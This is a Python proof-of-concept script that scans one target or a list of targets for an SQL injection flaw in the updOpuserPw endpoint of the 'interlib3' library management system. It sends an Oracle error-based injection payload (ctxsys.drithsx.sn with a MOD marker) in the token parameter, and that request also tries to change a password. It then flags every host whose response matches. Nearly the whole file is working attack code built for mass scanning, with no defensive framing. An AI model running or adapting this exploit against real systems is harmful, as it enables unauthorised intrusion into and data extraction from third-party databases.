import requests
import urllib3
from urllib.parse import urljoin,quote
import argparse
import ssl
ssl._create_default_https_context = ssl._create_unverified_context
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def read_file(file_path):
    with open(file_path, 'r') as file:
        urls = file.read().splitlines()
    return urls

def check(url):
    url = url.rstrip("/")
    target = urljoin(url, "/interlib3/service/sysop/updOpuserPw?loginid=test&newpassword=12356&token=1%27and+ctxsys.drithsx.sn(1,(select%20MOD(999999,1928)%20from%20dual))=%272 H")
    headers = {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36"
    }
    proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
    try:
        response = requests.get(target, verify=False, headers=headers, timeout=15,proxies=proxies)
        if response.status_code == 200 and 'database' in response.text and '1295' in response.text:
                print(f"\033[31mDiscovered:{url}: tcsoftinterlib_updOpuserPw_SQLinject!\033[0m")
                return True
    except Exception as e:
        pass



if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("-u", "--url", help="URL")
    parser.add_argument("-f", "--txt", help="file")
    args = parser.parse_args()
    url = args.url
    txt = args.txt
    if url:
        check(url)
    elif txt:
        urls = read_file(txt)
        for url in urls:
            check(url)
    else:
        print("help")